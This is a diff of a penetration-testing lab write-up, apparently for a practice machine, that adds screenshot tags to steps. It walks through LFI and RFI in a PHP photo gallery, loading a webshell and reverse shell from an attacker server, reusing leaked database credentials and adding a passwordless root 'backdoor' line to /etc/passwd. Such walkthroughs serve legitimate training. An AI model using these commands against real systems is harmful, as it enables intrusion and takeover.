@@ -18,25 +18,37 @@ After discovering a PHP web application running on port 80, we fuzzed for files 
 ```bash
 sudo nmap 192.168.146.58 -p- -sCV
 ```
-- Screen 1
+<p align="center">
+  <img src="./assets/Screenshots/1.png" />
+</p>
+
 
 - After accessing the web application, we noticed that it ran on PHP (`Simple PHP Photo Gallery v0.8`). therefore, we fuzzed for PHP files and we found the `image.php` file: 
 ```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt:FUZZ -u http://192.168.146.58/FUZZ.php -t 180 -ic
 ```
-- Screen 2
+<p align="center">
+  <img src="./assets/Screenshots/2.png" />
+</p>
+
 
 - Afterwards, we fuzzed for valid parameters, and we discovered that `img` was a valid one: 
 ```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://192.168.146.58/image.php?FUZZ=test -t 180 -ic -fs 1508
 ```
-- Screen 3
+<p align="center">
+  <img src="./assets/Screenshots/3.png" />
+</p>
+
 
 - Following that, we inspected the web application and noticed that it seemed to be including the file we provided as the parameter's value: 
 ```bash
 http://192.168.146.58/image.php?img=test
 ```
-- Screen 4
+<p align="center">
+  <img src="./assets/Screenshots/4.png" />
+</p>
+
 
 # Exploitation 
 ---
@@ -45,11 +57,17 @@ http://192.168.146.58/image.php?img=test
 ```bash
 http://192.168.146.58/image.php?img=../../../../etc/passwd
 ```
-- Screen 5
+<p align="center">
+  <img src="./assets/Screenshots/5.png" />
+</p>
+
 
 - Side note: we attempted to read the SSH private key (if any) of the `michael` user, but we couldn't (either it was non-existent or we did not have access to it).
 	- Note that we also tried the `id_ed25519` name.
-- Screen side1 
+<p align="center">
+  <img src="./assets/Screenshots/side1.png" />
+</p> 
+
 
 - We tested for RFI and the application did follow the URL we provided.
 - First, we set up a python HTTP server: 
@@ -61,7 +79,10 @@ python3 -m http.server 80
 ```bash
 http://192.168.146.58/image.php?img=http://192.168.45.220/help
 ```
-- Screen 6
+<p align="center">
+  <img src="./assets/Screenshots/6.png" />
+</p>
+
 
 - Having confirmed the vulnerability, we attempted to exploit it to gain RCE on the target.
 - First, we created a PHP webshell and served it with our python HTTP server: 
@@ -74,7 +95,10 @@ python3 -m http.server 80
 ```bash
 http://192.168.146.58/image.php?img=http://192.168.45.220/webshell.php&cmd=id
 ```
-- Screen 7
+<p align="center">
+  <img src="./assets/Screenshots/7.png" />
+</p>
+
 
 - Following that, we attempted to gain a reverse shell in order to achieve a foothold on the target.
 - We started by setting up a listener: 
@@ -86,7 +110,10 @@ sudo nc -lnvp 22
 ```bash
 http://192.168.146.58/image.php?img=http://192.168.45.220/php-reverse-shell.php
 ```
-- Screen 8
+<p align="center">
+  <img src="./assets/Screenshots/8.png" />
+</p>
+
 
 - Before progressing any further we stabilized our shell: 
 ```bash
@@ -102,7 +129,10 @@ stty raw -echo; fg
 ```bash
 cat /var/www/html/db.php
 ```
-- Screen 9
+<p align="center">
+  <img src="./assets/Screenshots/9.png" />
+</p>
+
 
 - Hence, we looged in to the MySQL instance using the credentials we found and we recovered a new set of credentials: 
 ```bash
@@ -110,7 +140,10 @@ mysql -u root -pMalapropDoffUtilize1337
 use SimplePHPGal;
 select * from users;
 ```
-- Screen 10
+<p align="center">
+  <img src="./assets/Screenshots/10.png" />
+</p>
+
 
 - We double base64 decoded `michael`'s password and authenticated as him: 
 ```bash
@@ -118,20 +151,29 @@ echo 'U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==' | base64 -d | base64 -d
 su michael
 id
 ```
-- Screen 11
+<p align="center">
+  <img src="./assets/Screenshots/11.png" />
+</p>
+
 
 - We collected the first flag: 
 ```bash
 cat /home/michael/local.txt && id && ip a
 ```
-- Screen 12
+<p align="center">
+  <img src="./assets/Screenshots/12.png" />
+</p>
+
 
 - Upon inspecting files writable by us, we discovered that we had write permission over `/etc/passwd`: 
 	- Note that overlong commands break the shell, which is why the screenshot may seem weird.
 ```bash
 find / \( -path /proc -o -path /sys \) -prune -o -type f -writable -print 2>/dev/null
 ```
-- Screen 13
+<p align="center">
+  <img src="./assets/Screenshots/13.png" />
+</p>
+
 
 - Therefore, we created a new user (without a password) with root permissions, logged in as him and gained a root shell: 
 ```bash
@@ -139,13 +181,19 @@ echo 'backdoor::0:0:Superuser:/root:/bin/bash' >> /etc/passwd
 su backdoor
 id
 ```
-- Screen 14
+<p align="center">
+  <img src="./assets/Screenshots/14.png" />
+</p>
+
 
 - Finally, we retrieved the last flag: 
 ```bash
 cat /root/proof.txt && id && ip a
 ```
-- Screen 15
+<p align="center">
+  <img src="./assets/Screenshots/15.png" />
+</p>
+
 
 # Trophy 
 ---
